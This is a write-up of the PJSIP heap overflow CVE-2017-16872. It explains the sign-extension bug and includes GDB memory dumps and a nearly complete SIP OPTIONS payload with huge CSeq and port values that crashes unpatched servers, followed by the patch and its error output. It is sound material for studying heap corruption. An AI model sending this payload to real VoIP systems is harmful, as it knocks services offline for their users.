# CVE-2017-16872

This vulnerability was found by Youngsung Kim from LINE. It's a pretty interesting bug regarding the type conversions between different number
datatypes. They discovered that PJSIP was doing some improper type conversions on information that could be manipulated by a remote request. Here is
how it works.

# The vulnerability

The vulnerability is pretty well explained [here](https://engineering.linecorp.com/en/blog/buffer-overflow-in-pjsip-a-voip-open-source-library), but
I'll go over the main points so that we can understand how an exploit might work.

The issue stems from the converstion from an `int` to an `unsigned long`. When this kind of type conversion happens, the process does something called
a sign extension that essentially just extends the value to fill the space of an unsigned long. For example, a value like `0xFFFFFFFF` or `-1` as an
`int` would sign extend to `0xFFFFFFFFFFFFFFFF` as a long. This would normally not be a problem, but the `pj_utoa()` custom function expects an
unsigned long and creates the string based off an unsigned long. A normal 4-byte integer would normally max out at 10 bytes in string form, but the
sign extension has doubled the size of the string to 20 bytes. At the beginning of the function, the `len_required` value gets set in order to
allocate the proper size heap block to get the job done. This value gets set to the length of the data + 9 + 9 + 16 totalling 34 bytes past the data
in the request. This would not be a problem if it was only doing one utoa function, but the program runs 2. One for the `CSeq` number and one for the
`port`. As a result, you have 40 possible bytes that could be allocated to a 34 byte space creating a buffer overflow.

So why does this matter? Well the remote requester has control over those numbers as they get sent in, so they arbitrarily create these buffer
overflows. This is what we will do with the exploit. That's about as much detail as I'll go into for the vulnerability, since it's explained much
better in the original article linked up above. 

# The exploit

Building this exploit is relatively finicky. Since the heap allocator for PJ was custom built, it's hard to get automated tools to do the heap
checking. As a result, I did most of the exploit debugging in GDB and manually looked at the values to see how they were being modified.
[This](https://issues-archive.asterisk.org/ASTERISK-27319) ticket gave me a good starting point for looking into these values. Basically the goal of
the exploit is to modify the payload so that it fills the block of space that gets allocated to the to the heap, but not so much that it forces the
heap allocator to allocate a larger chunk. The way to test this is to first get the `len_required` variable which is based on the length of the
request. Then get the distance between pool chunks made by the allocator. If the pjsip program is compiled with debugging symbols, you can directly
reference the variables in GDB to get the proper size. Sadly, since this is a custom heap implementation, automated tools like pwndbg's `heap`
functionality don't work. This is what that looks like:
```
pwndbg> p pool->block_list->next->end - pool->block_list->next->cur
$1 = 1488
pwndbg> p len_required
$3 = 1487
```
Make sure you get to the point in the `create_tsx_key_2543` function that actually sets the value of this variable to the size of the request.

I made the payload the perfect size to that it's just small enough to not allocate a larger block. So now, I have a payload that fits in the proper
size, but I have no idea how this actually overflows the buffer. Turns out the program just calls the `pj_utoa()` function multiple times and appends
those values to the end of the string separated by a `":"` with some `"$"` characters separating parts of it. So the way it would look in the heap is
something like `data:cseq:port\0`. And if we look at the payload in memory, you can see exactly that:
```
pwndbg> x/s 0x5a70ff9beff0 -0x30   ### The is the point in memory at the end of the heap block
0x5a70ff9befc0:	'A' <repeats 13 times>, "$18446744073709551614$$a$4:18446744073709551614$"
```
So now the heap has been overwritten, but to really understand this exploit to see what is actually happening we need to look at what is being
overwritten. I used the method above to look at the memory before and after the buffer overflow to see what is being overwritten:;
```
### BEFORE THE OVERFLOW
pwndbg> print *pool->block_list->next
$1 = {
  prev = 0x6060345810f0,
  next = 0x606034581120,
  buf = 0x6060345820d8 "\240\020X4``",
  cur = 0x606034583a20 "",
  end = 0x606034583ff0 "0@X4``"
}
pwndbg> x/10xg 0x606034583ff0 - 0x20 
0x606034583fd0:	0x0000000000000040	0x0000000000000050
0x606034583fe0:	0x0000606034583f40	0x0000000000000003
0x606034583ff0:	0x0000606034584030	0x0000000000000211 ## This is the beginning of the block

### AFTER THE OVERFLOW
pwndbg> x/10xg 0x606034583ff0 - 0x20
0x606034583fd0:	0x3730343437363434	0x3631353539303733
0x606034583fe0:	0x3a34246124243431	0x3434373634343831
0x606034583ff0:	0x3535393037333730	0x0000002434313631 ## Looks like the 0x211 and prev value got overwritten
```
So it looks like the 0x211 that was in the next block of the heap was overwritten. This turns out to be the size value for the object in memory. Since
this has been overwritten, it will be improperly referenced if it is ever used later in the program. Sadly (for me writing the exploit), this object
was only referenced when the heap attempts to be reset in the `pj_pool_reset()` function. This function just goes through the objects in the heap and
tries to free them. Obviously since the size value is set way too high, an error will occur. This is how we get a DoS. Since the heap overflow raises an
error, the entire program stops. This is what that looks like:
```
Send this payload:
b'OPTIONS sip:3 SIP/2.0\nf: <sip:2>\nt: <sip:1>\ni: a\nCSeq: 18446744073709551614 <AAAAAA...1451 times...> \nv: SIP/2.0/U 4:18446744073709551614\n\n'

Get this effect:
double free or corruption (!prev)
Aborted (core dumped)
```
# The patch

Since this issue was rampant throughout the codebase of pjsip, the patch was simply to validate the size of the request header values so that they fit
into 9 byte areas that they were meant to fit in. Here's the error you get when you try to run the exploit on the patched version (doesn't crash):
```
03:29:41.506           sip_parser.c !Error parsing '18446744073709551614': String value was greater than the maximum allowed value.
03:29:41.506           sip_parser.c  Error parsing '18446744073709551614': String value was greater than the maximum allowed value.
```
One extra thing that the developers could do is make sure the type of values going into functions are always the same as the value types being used 
within the function. This type confusion could easily cause more vulnerabilities in the future.

# Going further

This is about as far as this writeup will go. There is one thing that could be explored further and that is the `prev` pointer of that heap object.
Since the exploit successfully overwrites that, it is theoretically possible to put a value that points somewhere else in the program memory causing
an unknown effect. The reason I won't go into it is because sending the right value would require breaking/leaking ASLR in the program, which is
outside the scope of this vulnerability. 

# What can we learn from this

This is a great heap vulnerability to learn from. Since this is a custom heap implementation, it required me to dive into the heap values and look at
the raw memory to see what was really going on. Understanding heap corruption is vital to modern day exploitation and CTF challenges don't really do
it justice. This is mainly because heap corruption in the real world rarely leads to an actual full chain get-a-shell exploit. Instead, CTF challenges
have to alter the challenge to make it super easy to modify the heap. This implementation is a great practice for real-world vulnerabilities since
it's all custom built and requires you too look at how it really works to build any kind of exploit for it.
